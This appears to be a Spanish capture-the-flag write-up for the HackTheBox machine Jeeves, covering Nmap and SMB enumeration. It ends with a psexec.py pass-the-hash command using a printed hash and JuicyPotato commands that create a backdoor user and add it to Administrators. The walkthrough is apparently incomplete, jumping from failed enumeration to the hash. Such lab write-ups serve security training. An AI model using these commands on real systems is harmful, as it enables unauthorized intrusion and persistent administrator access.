# Reconocimiento

### Nmap

Comenzamos con el escaneo de puertos con la herramienta Nmap.

```
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.63 -oG allPorts
```

![](ss/Jeeves/nmap.png)

Puertos encontrados:
- 80
- 135
- 445
- 50000

Siguiente paso es identificar los servicios que estan correindo por detras de esos puertos, eso lo hacemos con los siguientes parametros "-sC" para lanzar una serie de scripts de reconocimiento y  "-sV" para identificar las versiones.

Esos dos parametros los podemos simplificar de la siguiente manera ( -sCV ):

```
nmap -p80,135,445 -sCV 10.10.10.63 -oN targeted
```

![](ss/Jeeves/nmap-services.png)

## Puerto 80 ( http )

Esta pagina parece ser un RabbitHole, osea no nos llevara a ningun lado.

![](ss/Jeeves/rabbitHole.png)

Los enlaces no redirijen a ningun sitio y la accion de el form es mostrar un error.html que contiene una imgen de error.

![](ss/Jeeves/errorHtml.png)

Al buscar cualquier dato en el searchBar te muestra la siguiente imgen.

![](ss/Jeeves/imgError.png)

Por lo tanto descartamos este puerto.

## Puerto 445

Para ver exactamente a lo que me estoy enfrentando puedo hacer lo siguiente:

```
crackmapexec smb 10.10.10.63
```

Bueno estamos ante un windows 10 pro x64, la maquina tiene el nombre JEEVES y el smb no esta firmado.

![](ss/Jeeves/cme.png)

Como el el servicio SMB esta expuesto puedo probar listar los recursos compartidos a nivel de red existentes con la herramienta smbclient.

```
smbclient -L 10.10.10.63 -N
```

![](ss/Jeeves/smbclient.png)

Probamos con otra herramienta alternativa, smbmap.

```
smbmap -H 10.10.10.63
```

Pero no consigo nada.

![](ss/Jeeves/smbmap.png)

Pruebo con NULL session y nada.

![](ss/Jeeves/smbmap-null.png)

## Psexec.py

```
psexec.py WORKGROUP/Administrator@10.10.10.63 -H e0fb1fb85756c24235ff238cbe81fe00
```

## Juicy Potato

Crear un nuevo usuario.

```
JuicyPotato.exe -t * -p c:\Windows\System32\cmd.exe -a "/c net user pos3idon pos3idon123$! /add" -l 1234
```

Agregar usuario nuevo al grupo Administrators

```
JuicyPotato.exe -t * -p c:\Windows\System32\cmd.exe -a "/c net localgroup Administrators pos3idon /add" -l 1234
```

